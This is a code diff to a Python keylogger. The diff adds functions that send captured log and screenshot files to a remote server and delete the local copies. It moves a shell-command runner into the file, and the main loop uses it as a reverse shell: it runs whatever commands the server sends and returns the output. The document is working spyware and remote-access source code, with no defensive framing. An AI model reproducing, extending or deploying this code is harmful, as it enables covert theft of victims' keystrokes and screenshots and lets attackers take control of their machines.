@@ -6,6 +6,7 @@ import os
 import platform
 import pyautogui
 import socket
+import subprocess
 import time
 import utils
 from datetime import datetime, timedelta
@@ -67,7 +68,7 @@ class Keylogger:
         if self.active:
             self.log += f"[R_CLICK, {mouse.get_position()}]"
 
-#--------------- WRITE FUNCTIONS ---------------#
+#--------------- FILE FUNCTIONS ---------------#
     def write_information_file(self):
         if not os.path.exists(self.log_directory):
                 os.makedirs(self.log_directory)
@@ -134,25 +135,7 @@ class Keylogger:
                 self.connected = False
                 logging.debug(err)
                 time.sleep(self.reconnect_interval)
-
-    def send_to_server(self, data: str | bytes, filename: str = None):
-        chunk_size = utils.BUFFSIZE-96  # chunk_size must be lower than BUFFSIZE, because encrypting adds some bytes to the chunk.        
-        if isinstance(data, str):
-            data = data.encode(utils.ENCODING) # if sent data is of type string, encode it to bytes
-
-        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
-
-        # create and send header, containing filename and number of chunks that will be sent
-        if filename:
-            header = "__".join([filename, str(len(chunks))]).encode(utils.ENCODING)
-        else:
-            header = str(len(chunks)).encode(utils.ENCODING)
-        self.encrypt_and_send(header)
-        
-        for chunk in chunks:
-            self.encrypt_and_send(chunk)
-            time.sleep(0.001)
-
+                
     def encrypt_and_send(self, data: bytes):
         encrypted_data = utils.encrypt(data)
         while True:
@@ -163,6 +146,35 @@ class Keylogger:
                 self.connected = False
                 logging.debug(err)
                 self.connect_to_host()
+
+    def send_message_to_server(self, data: str):
+        chunk_size = utils.BUFFSIZE-96
+        data = data.encode(utils.ENCODING)
+        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
+
+        # create and send header, containing filename and number of chunks that will be sent
+        header = str(len(chunks)).encode(utils.ENCODING)
+        self.encrypt_and_send(header)
+        
+        for chunk in chunks:
+            self.encrypt_and_send(chunk)
+            time.sleep(0.001)
+            
+    def send_files_to_server(self, files: list):
+        chunk_size = utils.BUFFSIZE-96
+        number_of_files = len(files)
+
+        for index, file in enumerate(files):
+            data = read_file_and_delete(file)
+            chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
+
+            # create and send header, containing filename and number of chunks that will be sent
+            header = "__".join([os.path.split(file)[1], str(len(chunks)), str(number_of_files-index)]).encode(utils.ENCODING)
+            self.encrypt_and_send(header)
+            
+            for chunk in chunks:
+                self.encrypt_and_send(chunk)
+                time.sleep(0.005)
 
     def receive_message_from_server(self):
         try:
@@ -217,6 +229,27 @@ class Keylogger:
         self.deactivate()
         self.sock.close()
 
+#--------------- FUNCTIONS ---------------#
+def read_file_and_delete(filename:str) -> bytes:
+    if filename.endswith(".txt"):
+        with open(filename, "r", encoding=utils.ENCODING) as file:
+            data = file.read().encode(utils.ENCODING)
+    elif filename.endswith(".png"):
+        with open(filename, "rb") as file:
+            data = file.read()
+    os.remove(filename)
+    return data
+
+def execute_command(command:str) -> str:
+    pipe = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
+    stderr = pipe.stderr.read()
+    stdout = pipe.stdout.read()
+
+    if stderr:
+        return stderr
+    else:
+        return stdout
+
 #--------------- MAIN ---------------#
 if __name__ == "__main__":
     keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
@@ -229,27 +262,26 @@ if __name__ == "__main__":
             if reverse_shell_active:
                 if recv == "exit":
                     reverse_shell_active = False
-                    keylogger.send_to_server("reverse shell deactivated")
+                    keylogger.send_message_to_server("reverse shell deactivated")
                 else:
-                    data = utils.execute_command(recv)
-                    keylogger.send_to_server(data)
+                    data = execute_command(recv)
+                    keylogger.send_message_to_server(data)
             else:
                 if recv == "activate":
                     keylogger.activate()
-                    keylogger.send_to_server("logging activated")
+                    keylogger.send_message_to_server("logging activated")
                 elif recv == "deactivate":
                     keylogger.deactivate()
-                    keylogger.send_to_server("logging deactivated")
+                    keylogger.send_message_to_server("logging deactivated")
                 elif recv == "send":
-                    filename = "test.png"
-                    keylogger.send_to_server(data=utils.convert_file_to_bytes(filename, "tmp"), filename=filename)
+                    keylogger.send_files_to_server(["tmp/test1.png","tmp/test2.png"])
                 elif recv == "shell":
                     reverse_shell_active = True
-                    keylogger.send_to_server("reverse shell activated")
+                    keylogger.send_message_to_server("reverse shell activated")
                 elif recv == "stop":
-                    keylogger.send_to_server("keylogger stopped")
+                    keylogger.send_message_to_server("keylogger stopped")
                     keylogger.stop()
                     break
                 else:
-                    keylogger.send_to_server("received")
+                    keylogger.send_message_to_server("received")
                     print(recv)
